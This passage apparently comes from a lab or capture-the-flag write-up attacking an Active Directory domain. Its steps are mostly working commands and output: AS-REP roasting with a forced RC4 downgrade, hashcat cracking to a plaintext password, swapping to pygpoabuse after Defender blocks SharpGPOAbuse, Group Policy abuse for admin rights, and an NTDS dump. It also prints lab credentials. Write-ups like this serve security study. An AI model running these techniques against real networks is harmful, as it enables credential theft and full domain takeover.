## AS-REP Roasting — jack.dowland

The kerbrute release binary on GitHub doesn't have the pre-auth check feature — build from source:

```bash
git clone https://github.com/ropnop/kerbrute
cd kerbrute && go build .
sudo mv kerbrute /usr/local/bin/
```

First run without `--downgrade`:

```bash
kerbrute userenum -d SYSCO.LOCAL --dc 10.1.113.191 users.txt
```

```text
2026/03/27 17:08:37 >  [+] VALID USERNAME:       greg.shields@SYSCO.LOCAL
2026/03/27 17:08:37 >  [+] VALID USERNAME:       lainey.moore@SYSCO.LOCAL
2026/03/27 17:08:38 >  [+] jack.dowland has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$jack.dowland@SYSCO.LOCAL:3bddffcffd8ac280bcbffe8c1910d613$...
```

`jack.dowland` has pre-auth disabled — but the hash format is `$krb5asrep$18$`, which is AES-256 (etype 18). Hashcat cannot crack this. Force a downgrade to RC4 (etype 23) with `--downgrade`:

![kerbrute-aes](/assets/img/sysco/kerbrute-aes.png)

```bash
kerbrute userenum -d SYSCO.LOCAL --dc 10.1.113.191 users.txt --downgrade
```

```text
2026/03/27 17:09:28 >  [+] VALID USERNAME:       lainey.moore@SYSCO.LOCAL
2026/03/27 17:09:28 >  [+] VALID USERNAME:       greg.shields@SYSCO.LOCAL
2026/03/27 17:09:29 >  [+] jack.dowland has no pre auth required. Dumping hash to crack offline:
$krb5asrep$23$jack.dowland@SYSCO.LOCAL:34335cd20a4a1c628bb2b8dea8555ffe$...
```

![kerbrute-rc4](/assets/img/sysco/kerbrute-rc4.png)

Now we have a crackable `$krb5asrep$23$` hash. Crack it with hashcat:

```powershell
.\hashcat.exe -m 18200 .\hashes.txt .\rockyou.txt
```

```text
$krb5asrep$23$jack.dowland@SYSCO.LOCAL:...:musicman1

Status: Cracked
```

Credentials: `jack.dowland:musicman1`

## Privilege Escalation — GPO Abuse (Group Policy Creator Owners)

`greg.shields` is a member of `Group Policy Creator Owners`, which holds `WriteDacl`, `WriteOwner`, `GenericAll`, and `GenericWrite` over the `Default Domain Policy` — full control to modify it directly:

![bloodhound-gpo](/assets/img/sysco/bloodhound-gpo.png)

Get a shell as Greg and enumerate existing GPOs:

```bash
ewp -i 10.1.113.191 -u greg.shields -p '5y5coSmarter2025!!!'
```

```text
evil-winrm-py PS C:\programdata> Get-GPO -All | Select DisplayName, Id
```

```text
DisplayName                       Id
-----------                       --
Default Domain Policy             31b2f340-016d-11d2-945f-00c04fb984f9
Default Domain Controllers Policy 6ac1786c-016f-11d2-945f-00c04fb984f9
```

![get-gpo](/assets/img/sysco/get-gpo.png)

SharpGPOAbuse gets caught by Defender:

```text
evil-winrm-py PS C:\programdata> .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount greg.shields --GPOName "Default Domain Policy"
Program 'SharpGPOAbuse.exe' failed to run: Operation did not complete successfully
because the file contains a virus or potentially unwanted software
```

![defender-block](/assets/img/sysco/defender-block.png)

Use `pygpoabuse` instead — abuse the Default Domain Policy to add `greg.shields` to local administrators:

```bash
pygpoabuse SYSCO.LOCAL/greg.shields:'5y5coSmarter2025!!!' -gpo-id "31b2f340-016d-11d2-945f-00c04fb984f9" -command "net localgroup administrators greg.shields /add" -powershell -dc-ip 10.1.113.191
```

```text
[+] ScheduledTask TASK_c4dcb98f created!
```

Force a policy update to apply it immediately:

```text
evil-winrm-py PS C:\programdata> gpupdate /force
```

Greg is now a local admin — dump NTDS:

```bash
nxc smb 10.1.113.191 -u greg.shields -p '5y5coSmarter2025!!!' --ntds
```

```text

SMB  10.1.113.191  445  DC01  [+] Dumping the NTDS, this could take a while so go grab a redbull...
```
